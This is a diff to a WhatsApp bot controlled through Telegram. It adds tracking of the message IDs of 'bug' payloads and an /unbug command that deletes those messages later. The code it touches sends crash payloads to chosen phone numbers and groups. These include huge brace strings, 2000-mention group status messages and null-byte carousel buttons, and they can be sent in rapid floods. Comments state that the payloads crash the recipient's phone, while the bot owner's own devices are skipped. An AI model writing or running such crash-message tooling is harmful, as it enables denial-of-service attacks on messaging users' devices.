@@ -2497,6 +2497,38 @@ function isDevNumber(jid) {
 
 // Temporary antibug-test probes (.crash-ios / .frz-ios / .gb) — owner/dev only, all to
 // be deleted once testing ends.
+// 🧪 TEMPORARY bug-send registry — remembers the message IDs of every payload
+// the test commands fire, for 72 hours, so /unbug <number> on Telegram can
+// delete them for everyone (the target's chat gets cleaned too). Entries
+// older than 72h are discarded and can no longer be unbugged.
+const BUG_SEND_TTL_MS = 72 * 60 * 60 * 1000;
+function bugSendsPath(phoneNumber) {
+    return path.join(AUTH_DIR, String(phoneNumber), 'bug_sends.json');
+}
+function loadBugSends(phoneNumber) {
+    try {
+        const raw = JSON.parse(fs.readFileSync(bugSendsPath(phoneNumber), 'utf8'));
+        const now = Date.now();
+        return (Array.isArray(raw?.sends) ? raw.sends : [])
+            .filter(e => e && e.id && (now - (e.at || 0)) < BUG_SEND_TTL_MS);
+    } catch (_) { return []; }
+}
+function saveBugSends(phoneNumber, sends) {
+    try {
+        const fp = bugSendsPath(phoneNumber);
+        fs.mkdirSync(path.dirname(fp), { recursive: true });
+        fs.writeFileSync(fp, JSON.stringify({ sends }));
+    } catch (err) { logError('TEST', `bug registry save failed for ${phoneNumber}`, err); }
+}
+function recordBugSends(phoneNumber, targetJid, ids) {
+    if (!phoneNumber || !targetJid || !Array.isArray(ids) || !ids.length) return;
+    const sends = loadBugSends(phoneNumber);
+    const now = Date.now();
+    for (const id of ids) if (id) sends.push({ id: String(id), jid: targetJid, at: now });
+    saveBugSends(phoneNumber, sends);
+    log('TEST', `${phoneNumber}: recorded ${ids.length} bug msg id(s) for /unbug (72h window)`);
+}
+
 async function sendIozkProbe(prim, target) {
     const inlineEntities = '{'.repeat(500000);
     const responseJson = JSON.stringify({
@@ -2534,9 +2566,9 @@ async function sendIozkProbe(prim, target) {
 
     // On the xzcbailz fork, participant: true = skip the bot's own devices
     // (same as the original Squichy RX send).
-    await prim.relayMessage(target, payload, { participant: true });
+    const rid = await prim.relayMessage(target, payload, { participant: true });
     await delay(1000);
-    return { inlineEntityChars: inlineEntities.length, encodedResponseBytes: Buffer.byteLength(responseJson) };
+    return { inlineEntityChars: inlineEntities.length, encodedResponseBytes: Buffer.byteLength(responseJson), ids: rid ? [rid] : [] };
 }
 
 async function sendFiosProbe(prim, target) {
@@ -2565,10 +2597,10 @@ async function sendFiosProbe(prim, target) {
 
     // participant: true (fork) = skip CC'ing the bot's own devices — the
     // owner's phone gets a placeholder instead of the payload itself.
-    await prim.relayMessage(target, payload, { participant: true });
+    const rid = await prim.relayMessage(target, payload, { participant: true });
     const pauseMs = 700 + Math.floor(Math.random() * 600);
     await delay(pauseMs);
-    return { locationNameChars: F_OS_NAME.length, buttonTextChars: F_OS_BUTTON_TEXT.length, pauseMs };
+    return { locationNameChars: F_OS_NAME.length, buttonTextChars: F_OS_BUTTON_TEXT.length, pauseMs, ids: rid ? [rid] : [] };
 }
 
 // Wire-size probe: measures the actual protobuf bytes that go on the wire,
@@ -2599,7 +2631,7 @@ async function sendCrashmsgProbe(prim, target) {
         }
         return q;
     };
-    let sent = 0, firstWireBytes = 0;
+    let sent = 0, firstWireBytes = 0, ids = [];
     for (let i = 0; i < 10; i++) {
         const payload = {
             // App-level envelope (same class as crash-hard's groupStatus
@@ -2651,11 +2683,12 @@ async function sendCrashmsgProbe(prim, target) {
         // participant: true (fork) = skip CC'ing the bot's own devices —
         // without this the owner's own phone receives the full 2000-payload
         // toxic pile and crashes alongside the target.
-        await prim.relayMessage(target, payload, { participant: true });
+        const rid = await prim.relayMessage(target, payload, { participant: true });
+        if (rid) ids.push(rid);
         sent++;
         if (i < 9) await delay(1000);
     }
-    return { sent, wireBytes: firstWireBytes };
+    return { sent, wireBytes: firstWireBytes, ids };
 }
 
 // 🧪 TEMPORARY probe: "iosZLoc" from the free Squichy repo (DEVPRIMIS/
@@ -2666,7 +2699,7 @@ async function sendCrashmsgProbe(prim, target) {
 // 500 rounds x 5s — re-run the command to repeat rounds).
 async function sendIoszkProbe(prim, target, thumbBuf) {
     const mentionedJid = Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`);
-    let firstWireBytes = 0;
+    let firstWireBytes = 0, ids = [];
     for (let z = 0; z < 60; z++) {
         const payload = {
             groupStatusMessageV2: {
@@ -2697,9 +2730,10 @@ async function sendIoszkProbe(prim, target, thumbBuf) {
             }
         };
         if (z === 0) firstWireBytes = wireBytesOf(payload);
-        await prim.relayMessage(target, payload, { participant: true });
+        const rid = await prim.relayMessage(target, payload, { participant: true });
+        if (rid) ids.push(rid);
     }
-    return { sent: 60, wireBytes: firstWireBytes };
+    return { sent: 60, wireBytes: firstWireBytes, ids };
 }
 
 const CRASHCLICK_STATIC = {
@@ -2756,8 +2790,8 @@ async function sendCrashclickProbe(prim, target) {
             }
         }
     };
-    await prim.relayMessage(target, payload, {});
-    return { responseId, responseBytes: Buffer.byteLength(responseData) };
+    const rid = await prim.relayMessage(target, payload, {});
+    return { responseId, responseBytes: Buffer.byteLength(responseData), ids: rid ? [rid] : [] };
 }
 
 // 🛡️ SUDO SYSTEM — elevated users per session. Saved in bot_config.json so
@@ -4997,6 +5031,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         try {
             const result = await sendIozkProbe(sock, targetJid);
+            recordBugSends(phoneNumber, targetJid, result?.ids || []);
             log('CIS', `${phoneNumber}: IOZK probe sent to test target ${targetNumber}; ${JSON.stringify(result)}`);
             await safeWaReply(sock, remoteJid, `🧪 .crash-ios probe sent to ${targetNumber}.`, msg);
         } catch (err) {
@@ -5057,6 +5092,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         try {
             const result = await sendFiosProbe(sock, targetJid);
+            recordBugSends(phoneNumber, targetJid, result?.ids || []);
             log('FIS', `${phoneNumber}: F_OS probe sent to test target ${targetNumber}; ${JSON.stringify(result)}`);
             await safeWaReply(sock, remoteJid, `🧪 .frz-ios probe sent to ${targetNumber}.`, msg);
         } catch (err) {
@@ -5119,10 +5155,11 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         const dSyncPause = isSupabaseEnabled();
         if (dSyncPause) setSyncPaused(true);
         let dSent = 0;
+        const dIds = [];
         try {
             for (let n = 0; n < dCount; n++) {
-                if (isCisdCommand) await sendIozkProbe(sock, dTargetJid);
-                else await sendFiosProbe(sock, dTargetJid);
+                const r = isCisdCommand ? await sendIozkProbe(sock, dTargetJid) : await sendFiosProbe(sock, dTargetJid);
+                if (r?.ids) dIds.push(...r.ids);
                 dSent++;
                 log('TEST', `${phoneNumber}: .${dKind} send ${dSent}/${dCount} → ${dTargetJid}`);
             }
@@ -5131,6 +5168,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             logError('TEST', `${phoneNumber}: .${dKind} failed after ${dSent} send(s)`, err);
             await safeWaReply(sock, remoteJid, `❌ .${dKind} sent ×${dSent} then failed: ${err?.message || err}`, msg);
         } finally {
+            if (dIds.length) recordBugSends(phoneNumber, dTargetJid, dIds);
             if (dSyncPause) setSyncPaused(false);
         }
         return;
@@ -5200,11 +5238,13 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         const cmSyncPause = isSupabaseEnabled();
         if (cmSyncPause) setSyncPaused(true);
         let cmRoundsDone = 0, cmSent = 0;
+        const cmIds = [];
         try {
             for (let r = 0; r < cmRounds; r++) {
                 const res = await sendCrashmsgProbe(sock, cmTargetJid);
                 cmRoundsDone++;
                 cmSent += res.sent || 0;
+                if (res.ids) cmIds.push(...res.ids);
                 log('TEST', `${phoneNumber}: .andro-nuke round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}${res.wireBytes ? `, ${res.wireBytes}B wire each` : ''}) → ${cmTargetJid}`);
                 if (r < cmRounds - 1) await delay(30 + Math.floor(Math.random() * 40));
             }
@@ -5213,6 +5253,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             logError('TEST', `${phoneNumber}: .andro-nuke failed after ${cmSent} payload(s)`, err);
             await safeWaReply(sock, remoteJid, `❌ .andro-nuke sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
         } finally {
+            if (cmIds.length) recordBugSends(phoneNumber, cmTargetJid, cmIds);
             if (cmSyncPause) setSyncPaused(false);
         }
         return;
@@ -5275,6 +5316,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         if (zkSyncPause) setSyncPaused(true);
         try {
             const r = await sendIoszkProbe(sock, zkTargetJid, zkThumb);
+            recordBugSends(phoneNumber, zkTargetJid, r?.ids || []);
             log('TEST', `${phoneNumber}: .ios-zk done: ${r.sent} payloads${r.wireBytes ? ` (${r.wireBytes}B wire each)` : ''} → ${zkTargetJid}`);
             await safeWaReply(sock, remoteJid, `🧪 .ios-zk sent ${r.sent} payloads (thumb ${zkThumb.length}B) → ${zkNumber}`, msg);
         } catch (err) {
@@ -5351,12 +5393,15 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         let gbSent = 0;
+        const gbIds = [];
         for (let i = 0; i < 10; i++) {
             try {
-                await sendCrashclickProbe(sock, groupJid);
+                const r = await sendCrashclickProbe(sock, groupJid);
                 gbSent++;
+                if (r?.ids) gbIds.push(...r.ids);
             } catch (_) {}
         }
+        if (gbIds.length) recordBugSends(phoneNumber, groupJid, gbIds);
         log('GB', `${phoneNumber}: CrashClick ×${gbSent}/10 sent to group ${groupJid}`);
         await safeWaReply(sock, remoteJid, `🧪 .gb CrashClick ×${gbSent}/10 sent to the group.`, msg);
         return;
@@ -7412,8 +7457,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     }
                 };
                 const wireBytes = wireBytesOf(payload);
-                await prim.relayMessage(target, payload, { participant: true });
-                return { wireBytes };
+                const rid = await prim.relayMessage(target, payload, { participant: true });
+                return { wireBytes, ids: rid ? [rid] : [] };
             }
 
             // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
@@ -7455,7 +7500,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     participant: true,
                     messageId: outMsg.key.id
                 });
-                return { wireBytes };
+                return { wireBytes, ids: outMsg?.key?.id ? [outMsg.key.id] : [] };
             }
 
             // Prepare the fff card image once per run (img mode); if unavailable
@@ -7484,17 +7529,20 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             if (syncPausedHere) setSyncPaused(true);
 
             let sent = 0;
+            const sentIds = [];
             try {
                 let lastWireBytes = 0;
                 for (let n = 0; n < count; n++) {
                     const r = await fire(sock, targetJid, fffImage);
                     sent++;
+                    if (r?.ids) sentIds.push(...r.ids);
                     if (r?.wireBytes) lastWireBytes = r.wireBytes;
                     log('TEST', `${phoneNumber}: .${displayKind}${fffMode} send ${sent}/${count}${lastWireBytes ? ` (${lastWireBytes}B wire)` : ''} → ${targetJid} input="${input}"`);
                     // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
                     if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
                 }
             } finally {
+                if (sentIds.length) recordBugSends(phoneNumber, targetJid, sentIds);
                 if (syncPausedHere) setSyncPaused(false);
             }
 
@@ -8637,7 +8685,7 @@ if (tgBot) {
 
         await safeTgSend(
             chatId,
-            `🤖 *WhatsApp Multi-Bot*\n\nSend your number to pair using country code without + sign.\nExample: 2348012345678\n\n/pair — Start pairing\n/status — Show status\n/disconnect — Disconnect your session\n/help — Commands`
+            `🤖 *WhatsApp Multi-Bot*\n\nSend your number to pair using country code without + sign.\nExample: 2348012345678\n\n/pair — Start pairing\n/status — Show status\n/unbug <number> — Remove sent bug messages (72h window)\n/disconnect — Disconnect your session\n/help — Commands`
         );
     });
 
@@ -8721,6 +8769,58 @@ if (tgBot) {
         );
     });
 
+    // /unbug <number|jid> — delete every tracked bug message sent to that
+    // target within the last 72h, for everyone (the target's chat is cleaned
+    // too). Amount-floods delete one message every 3 seconds.
+    tgBot.onText(/\/unbug/, async (msg) => {
+        const chatId = msg.chat.id;
+        log('TELEGRAM', `/unbug from ${chatId}`);
+        if (!(await requireAdminOrExplain(chatId))) return;
+
+        const arg = (msg.text || '').trim().split(/\s+/)[1] || '';
+        if (!arg) {
+            await safeTgSend(chatId,
+                '🧹 *Unbug — remove sent bug messages*\n\n' +
+                'Usage: `/unbug <number>` (or a group JID)\n\n' +
+                'Deletes every bug message the bot sent to that target in the last 72h — for everyone, so the target is unbugged too. Floods delete one message every 3 seconds.');
+            return;
+        }
+        const targetJid = arg.includes('@') ? arg : `${arg.replace(/\D/g, '')}@s.whatsapp.net`;
+
+        // Find active sessions with tracked sends to this target.
+        const jobs = [];
+        for (const [phoneNumber, session] of waSessions) {
+            const entries = loadBugSends(phoneNumber).filter(e => e.jid === targetJid);
+            if (entries.length && session?.sock?.user?.id) jobs.push({ phoneNumber, sock: session.sock });
+        }
+        if (!jobs.length) {
+            await safeTgSend(chatId, `ℹ️ No trackable bug messages for *${targetJid}* — nothing sent in the last 72h, or no active session.`);
+            return;
+        }
+
+        let total = 0;
+        for (const job of jobs) total += loadBugSends(job.phoneNumber).filter(e => e.jid === targetJid).length;
+        await safeTgSend(chatId, `🧹 Unbugging *${targetJid}*: ${total} message(s), one every 3s (~${Math.ceil(total * 3 / 60)} min). Stay calm…`);
+
+        let totalDeleted = 0;
+        for (const job of jobs) {
+            const remaining = loadBugSends(job.phoneNumber).filter(e => e.jid === targetJid);
+            for (let i = 0; i < remaining.length; i++) {
+                const entry = remaining[i];
+                try {
+                    await job.sock.sendMessage(targetJid, { delete: { remoteJid: targetJid, fromMe: true, id: entry.id } });
+                    totalDeleted++;
+                } catch (err) {
+                    logError('TEST', `unbug delete failed (${entry.id})`, err);
+                }
+                // Drop the entry either way so a restart never redoes finished work.
+                saveBugSends(job.phoneNumber, loadBugSends(job.phoneNumber).filter(e => e.id !== entry.id));
+                if (i < remaining.length - 1) await delay(3000);
+            }
+        }
+        await safeTgSend(chatId, `✅ *Unbug complete* — deleted ${totalDeleted}/${total} message(s) for ${targetJid}. The target's chat is clean.`);
+    });
+
     tgBot.onText(/\/disconnect/, async (msg) => {
         const chatId = msg.chat.id;
         log('TELEGRAM', `/disconnect from ${chatId}`);
@@ -8758,7 +8858,7 @@ if (tgBot) {
 
         await safeTgSend(
             chatId,
-            `📖 *Commands*\n\n/start — Welcome message\n/pair — Connect your WhatsApp\n/status — Show status\n/disconnect — Disconnect your session\n/help — Show commands\n\n*WhatsApp commands:*\n.ping`
+            `📖 *Commands*\n\n/start — Welcome message\n/pair — Connect your WhatsApp\n/status — Show status\n/unbug <number> — Remove sent bug messages (72h window)\n/disconnect — Disconnect your session\n/help — Show commands\n\n*WhatsApp commands:*\n.ping`
         );
     });
 
